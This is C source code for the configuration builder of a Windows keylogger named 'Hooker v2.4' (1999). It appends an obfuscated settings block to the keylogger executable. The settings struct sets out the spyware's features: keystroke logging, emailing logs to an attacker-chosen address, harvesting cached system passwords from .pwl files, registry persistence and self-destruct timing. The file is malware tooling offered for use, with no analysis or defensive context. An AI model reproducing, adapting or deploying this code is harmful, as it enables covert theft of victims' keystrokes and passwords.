/********************************************************************/
/*                                                                  */
/*               Hooker v2.4 configuration module                   */
/*                         ACrazzi, 1999                            */
/*                                                                  */
/********************************************************************/

#include <stdio.h>
#include <string.h>
#include <windows.h>

#pragma pack( 1 )

struct _AttachedData {
        WORD signature;      //signature (0x3104)
        UINT loglimit;       //max logfile-size in bytes
        UINT sendafter;      //if log-size is more than this, then send it by mail
        UINT reg_descr_ofs;  //offset to description in registry
        UINT reg_path_ofs;   //offset to path in registry to install
        UINT exe_ofs;        //offset to exe-name
        UINT dll_ofs;        //offset to keylogdll-name
        UINT n_ss;           //number of substrings
        UINT ss_ofs;         //offset to substrings
        UINT logname_ofs;    //offset to logfile-name
        UINT host_ofs;       //offset to name of sendmail-server
        UINT mailfrom_ofs;   //offset to mailfrom address
        UINT mailto_ofs;     //offset to mailto address
        UINT subj_ofs;       //offset to subject of message
        UINT http_ofs;       //offset to address of file in web
        WORD port;           //sendmail's port (usually 25)
        SYSTEMTIME send_i;   //timespan between logfiles-sending
        SYSTEMTIME kill_i;   //timespan to self-destruct
        WORD total_log:1;    //keylog all time?
        WORD encrypt_log:1;  //encrypt keylog?
        WORD send_mail:1;    //send keylog by mail?
        WORD syspass:1;      //add system password (from *.pwl) to mail?
        WORD autokill:1;     //kill itself?
        WORD fullname:1;     //full exe-name in registry?
        WORD exepath:2;      //where? 0 - %windir%, 1 - %windir%\system, 2 - user-defined
        WORD ras:1;          //use RAS-functions for connection-detecting?
        WORD emp_log:1;      //log windows where nothing was pressed?
        WORD adv_log:1;      //log all 
        UINT number;         //identification number
};


#define GET_INT(var,name) \
        {\
                if (GetPrivateProfileInt(sec,(name),-1,ini) == -1) {\
                        printf("Error: section main:%s is not found\n",(name));\
                        return -1;\
                };\
                (var) = GetPrivateProfileInt(sec,(name),-1,ini);\
        }

#define GET_STR(var,name) \
        {\
                GetPrivateProfileString(sec,(name),"NULL",&dat[frame],0x200,ini);\
                if (!strcmp(&dat[frame],"NULL")) {\
                        printf("Error: section main:%s is not found\n",(name));\
                        return -1;\
                };\
                (var) = f_s + frame;\
                frame += GetPrivateProfileString(\
                        sec,(name),"",&dat[frame],0x200,ini) + 1;\
        }


int main (int argc,char* argv[])
{
char ini[0x100], exe[0x100],*sec,buf1[0x100];
char dat[0x8000];
int i,j,k,frame,f_s;
_AttachedData a_d;
SYSTEMTIME st;
FILE* h_f;
        printf("===============================================\n"
               "=    Hooker v2.4, configuration utility       =\n"
               "=    attach all config data at end of file    =\n"
               "===============================================\n");
        if (argc>3) {
                printf("Error: too many arguments\n");
                return -1;
        };
        if (argc<2) {
                printf("Usage: hkconf hooker.exe [ hkconf.ini ]\n");
                return -1;
        };
        strcpy(exe,argv[1]);
        if (argc == 3) strcpy(buf1,argv[2]); else strcpy(buf1,"hkconf.ini");
        GetCurrentDirectory(sizeof(ini),ini);
        strcat(ini,"\\");
        strcat(ini,buf1);
        //Файл ini существует?
        h_f = fopen(ini,"rb");
        if (!h_f) {
                printf("Error: cannot find file %s\n",ini);
                return -1;
        };
        fclose(h_f);
        //Открываем экзешник
        h_f = fopen(exe,"r+b");
        if (!h_f) {
                printf("Error: cannot open file %s\n",exe);
                return -1;
        };
        //его длина?
        fseek(h_f,0,SEEK_END);
        f_s = ftell(h_f);
//----------------------load data from ini file-----------------------
        a_d.signature = 0x3104;
        sec = "main";
        GET_INT(a_d.total_log,"total");
        GET_INT(a_d.emp_log,"full");
        GET_INT(a_d.adv_log,"adv");
        GET_INT(a_d.encrypt_log,"encrypt");
        GET_INT(a_d.send_mail,"mail");
        GET_INT(a_d.syspass,"syspass");
        GET_INT(a_d.autokill,"kill");
        GET_INT(a_d.fullname,"fullname");
        GET_INT(a_d.exepath,"exepath");
        GET_INT(a_d.ras,"ras");
        GET_INT(a_d.loglimit,"loglimit");
        GET_INT(a_d.sendafter,"sendafter");
        GET_INT(a_d.n_ss,"nss");
        GET_INT(a_d.port,"port");
        for (i=0,frame=0;(UINT)i<a_d.n_ss;i++) {
                sprintf(buf1,"s%2.2u",i);
                j = GetPrivateProfileString(
                        "strings",     // points to section name 
                        buf1,          // points to key name 
                        "NULL",        // points to default string 
                        &dat[frame],   // points to destination buffer  
                        0x200,         // size of destination buffer 
                        ini)           // points to initialization filename 
                        + 1; 
                if (!strcmp(&dat[frame],"NULL")) {
                        printf("Error: section strings:s%2.2u is not found\n",i);
                        return -1;
                };
                CharUpperBuff(&dat[frame],strlen(&dat[frame]));
                frame += j;
        };
        a_d.ss_ofs = f_s;
        GET_STR(a_d.reg_descr_ofs,"reg_desc");
        GET_STR(a_d.reg_path_ofs,"reg_path");
        GET_STR(a_d.exe_ofs,"exename");
        GET_STR(a_d.dll_ofs,"dllname");
        GET_STR(a_d.logname_ofs,"logname");
        GET_STR(a_d.host_ofs,"host");
        GET_STR(a_d.mailfrom_ofs,"mailfrom");
        GET_STR(a_d.mailto_ofs,"mailto");
        GET_STR(a_d.subj_ofs,"subj");
        GET_STR(a_d.http_ofs,"http");
        sec = "send";
        memset(&a_d.send_i,0,sizeof(SYSTEMTIME));
        a_d.send_i.wSecond = GetPrivateProfileInt(sec,"second",0,ini);
        a_d.send_i.wMinute = GetPrivateProfileInt(sec,"minute",0,ini);
        a_d.send_i.wHour = GetPrivateProfileInt(sec,"hour",1,ini);
        a_d.send_i.wDay = GetPrivateProfileInt(sec,"day",1,ini);
        sec = "kill";
        memset(&a_d.kill_i,0,sizeof(SYSTEMTIME));
        a_d.kill_i.wSecond = GetPrivateProfileInt(sec,"second",0,ini);
        a_d.kill_i.wMinute = GetPrivateProfileInt(sec,"minute",0,ini);
        a_d.kill_i.wHour = GetPrivateProfileInt(sec,"hour",1,ini);
        a_d.kill_i.wDay = GetPrivateProfileInt(sec,"day",1,ini);
        GetSystemTime(&st);
        a_d.number = st.wMilliseconds | 
                         1 |
                                 (st.wSecond<<16) | 
                                 (st.wHour<<24);
        memcpy(&dat[frame],&a_d,sizeof(_AttachedData));
        frame += sizeof(_AttachedData);
        //crypting...
        k = dat[frame-1];
        for (i=frame-1;i>=0;i--) {
                j = dat[i - 1];
                dat[i - 1] -= k;
                dat[i - 1] ^= k;
                k = j;
        };
        fseek(h_f,f_s,SEEK_SET);
        fwrite(dat,1,frame,h_f);
        fclose(h_f);
        printf("Data was loaded from %s\n",ini);
        printf("Executable is %s (original size: %i, size increased by %i)\n",exe,f_s,frame);
        return 0;
};